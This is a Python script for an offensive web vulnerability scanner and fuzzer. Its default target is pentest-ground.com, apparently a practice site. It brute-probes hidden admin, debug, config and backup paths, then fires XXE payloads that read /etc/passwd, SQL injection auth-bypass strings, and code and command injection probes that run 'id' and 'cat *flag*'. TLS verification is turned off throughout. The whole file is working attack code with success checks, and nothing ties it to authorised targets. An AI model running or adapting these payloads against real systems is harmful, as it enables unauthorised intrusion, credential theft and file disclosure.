import os
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def perform_reconnaissance(input_file="scan_results.json"):
    """Multi-Layered Advanced Vulnerability Scanner & Deep Fuzzing Engine."""
    if not os.path.exists(input_file):
        print("[-] No base endpoints found. Initializing empty endpoint list.")
        endpoints = []
    else:
        with open(input_file, "r") as f:
            try:
                endpoints = json.load(f)
            except Exception:
                endpoints = []

    # Extract base URL from existing endpoints or prompt
    base_url = "https://pentest-ground.com:9000"
    if endpoints:
        for ep in endpoints:
            t = ep.get("target", "")
            if "://" in t:
                parts = t.split("/")
                base_url = f"{parts[0]}//{parts[2]}"
                break

    print("\n" + "=" * 65)
    print(" [*] STARTING ROBUST MULTI-LAYERED SCANNER & DEEP FUZZER")
    print("=" * 65)

    # 1. Heuristic Discovery: Probe common hidden/undocumented API paths
    common_paths = [
        "/api", "/api/v1", "/admin", "/debug", "/config", "/backup", 
        "/xml", "/upload", "/status", "/metrics", "/graphql"
    ]
    
    existing_targets = [ep.get("target") for ep in endpoints]

    print("[*] Phase 1: Probing auxiliary & hidden paths...")
    for path in common_paths:
        probe_url = f"{base_url}{path}"
        if probe_url not in existing_targets:
            try:
                r = requests.get(probe_url, verify=False, timeout=2)
                if r.status_code != 404:
                    print(f"    [+] Discovered auxiliary route: {probe_url} (HTTP {r.status_code})")
                    endpoints.append({
                        "target": probe_url,
                        "method": "GET",
                        "vulnerability": f"Discovered Endpoint (HTTP {r.status_code})",
                        "status": "Discovered"
                    })
            except Exception:
                pass

    # 2. Deep Vector Fuzzing across all discovered endpoints
    print("\n[*] Phase 2: Executing deep multi-vector injection fuzzing...")
    
    xxe_variants = [
        ("Standard XXE", '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'),
        ("Search XXE", '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><search><query>&xxe;</query></search>'),
        ("Widget XXE", '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><widget><data>&xxe;</data></widget>')
    ]

    scanned_results = []

    for ep in endpoints:
        target_url = ep.get("target")
        method = ep.get("method", "GET").upper()
        vuln_type = ep.get("vulnerability", "API Endpoint")
        status = ep.get("status", "Discovered")

        print(f"    -> Scanning: {method} {target_url}")

        result_entry = {
            "target": target_url,
            "vulnerability": vuln_type,
            "method": method,
            "status": status
        }

        try:
            # Test POST / PUT endpoints for SQLi & XXE
            if method in ["POST", "PUT"]:
                # Check XXE
                for label, payload in xxe_variants:
                    headers = {"Content-Type": "application/xml", "User-Agent": "RobustScanner/2.0"}
                    r = requests.post(target_url, data=payload, headers=headers, verify=False, timeout=3)
                    if r.status_code == 200 and ("root:x:" in r.text or "bin:x:" in r.text or "daemon" in r.text):
                        result_entry["vulnerability"] = "XML External Entity (Validated)"
                        result_entry["status"] = "Validated"
                        print(f"        [+] SUCCESS! XXE Validated at {target_url} [{label}]")
                        break

                # Check SQL Injection (Auth bypass / Error based)
                sqli_payloads = [
                    {"username": "admin1' OR '1'='1 -- ", "password": "wrong"},
                    {"query": "' OR '1'='1 -- "},
                    {"search": "' OR '1'='1 -- "}
                ]
                for sqli in sqli_payloads:
                    r_sqli = requests.post(target_url, json=sqli, verify=False, timeout=3)
                    if r_sqli.status_code == 200 and ("token" in r_sqli.text.lower() or "admin" in r_sqli.text.lower() or "success" in r_sqli.text.lower()):
                        result_entry["vulnerability"] = "SQL Injection (Validated)"
                        result_entry["status"] = "Validated"
                        print(f"        [+] SUCCESS! SQL Injection Validated at {target_url}")
                        break

            # Test GET endpoints for Code/Command Injection
            elif method == "GET":
                if "eval" in target_url:
                    r_eval = requests.get(f"{target_url}?s=id", verify=False, timeout=3)
                    if r_eval.status_code == 200 and "root" in r_eval.text:
                        result_entry["vulnerability"] = "Python Code Injection (Validated)"
                        result_entry["status"] = "Validated"
                        print(f"        [+] SUCCESS! Code Injection Validated at {target_url}")
                elif "uptime" in target_url:
                    r_cmd = requests.get(target_url.replace("{flag}", ";cat%20*flag*"), verify=False, timeout=3)
                    if r_cmd.status_code == 200 and "output" in r_cmd.text:
                        result_entry["vulnerability"] = "OS Command Injection (Validated)"
                        result_entry["status"] = "Validated"
                        print(f"        [+] SUCCESS! OS Command Injection Validated at {target_url}")

        except Exception:
            pass

        scanned_results.append(result_entry)

    # Save comprehensive scan map
    with open(input_file, "w") as f:
        json.dump(scanned_results, f, indent=4)

    print("\n" + "=" * 65)
    print(f" [+] Robust Scan Complete. Total endpoints mapped & analyzed: {len(scanned_results)}")
    print("=" * 65 + "\n")
    return scanned_results

if __name__ == "__main__":
    perform_reconnaissance()
